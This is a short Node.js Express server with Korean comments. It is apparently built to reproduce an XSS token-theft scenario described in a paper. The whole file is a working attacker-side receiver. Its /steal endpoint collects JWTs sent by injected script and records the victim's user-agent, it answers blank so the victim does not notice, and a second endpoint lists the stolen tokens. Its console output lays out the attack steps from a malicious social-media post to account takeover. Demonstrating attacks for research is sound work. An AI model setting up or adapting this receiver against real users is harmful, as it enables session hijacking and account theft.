// 공격자 서버 - JWT 탈취를 시연하기 위한 서버
// 논문의 3.2절 XSS 공격 시나리오 재현용

const express = require('express');
const cors = require('cors');
const app = express();
const PORT = 5000;

app.use(cors());
app.use(express.json());

// 탈취된 토큰을 저장할 배열
const stolenTokens = [];

// 공격 엔드포인트 - XSS를 통해 호출됨
app.get('/steal', (req, res) => {
    const token = req.query.token;

    if (token) {
        const victimInfo = {
            token: token,
            timestamp: new Date().toISOString(),
            userAgent: req.headers['user-agent']
        };

        stolenTokens.push(victimInfo);

        console.log('\n========================================');
        console.log('🚨 [JWT 탈취 성공!] 🚨');
        console.log('========================================');
        console.log(`시간: ${victimInfo.timestamp}`);
        console.log(`토큰: ${token}`);
        console.log(`User-Agent: ${victimInfo.userAgent}`);
        console.log('========================================\n');
    }

    // 빈 응답 (피해자가 눈치채지 못하도록)
    res.status(200).send('');
});

// 탈취된 토큰 목록 확인
app.get('/stolen-tokens', (req, res) => {
    res.json({
        count: stolenTokens.length,
        tokens: stolenTokens
    });
});

app.listen(PORT, () => {
    console.log(`\n[공격자 서버 실행 중]`);
    console.log(`포트: ${PORT}`);
    console.log(`탈취 엔드포인트: http://localhost:${PORT}/steal?token=STOLEN_TOKEN`);
    console.log(`\n공격 시나리오:`);
    console.log(`1. 공격자가 SNS에 악성 스크립트를 포함한 게시물 작성`);
    console.log(`2. 피해자가 해당 게시물 조회`);
    console.log(`3. 피해자의 JWT가 이 서버로 전송됨`);
    console.log(`4. 공격자는 탈취한 JWT로 피해자 계정에 접근 가능\n`);
});
